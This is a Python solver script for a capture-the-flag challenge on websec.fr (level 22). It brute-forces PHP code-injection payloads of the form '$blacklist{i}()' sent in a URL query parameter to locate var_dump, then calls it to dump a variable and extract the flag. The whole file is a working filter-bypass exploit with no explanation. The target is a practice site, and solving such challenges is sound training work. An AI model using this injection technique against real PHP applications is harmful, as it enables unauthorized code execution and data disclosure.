import requests

url = "http://websec.fr/level22/index.php?code="
index, Flag, FLAG  = 0, [], ""
def Index():
	global index
	for i in range(1000):
		payload = "$blacklist{" + str(i) + "}()"
		res = requests.get(url+payload)
		if 'var_dump()' in res.text:
			index = i
			print("[{}] => var_dump".format(i))
			break

def Get_Flag():
	global FLAG
	payload = "$blacklist{579}($a)"
	res = requests.get(url+payload)
	Flag = res.text.split('pre')
	for i in range(len(Flag)):
		if "WEB" in Flag[i]:
			Flag = Flag[i].split('\"')
			break

	for i in range(len(Flag)):
		if "WEB" in Flag[i]:
			FLAG += Flag[i]
		elif "told_" in Flag[i]:
			FLAG += Flag[i]
		elif "flaw" in Flag[i]:
			FLAG += Flag[i]
			print("[+] Flag : {}".format(FLAG))
			break

if __name__ == '__main__':
	print("[+] Start")
	Index()
	Get_Flag()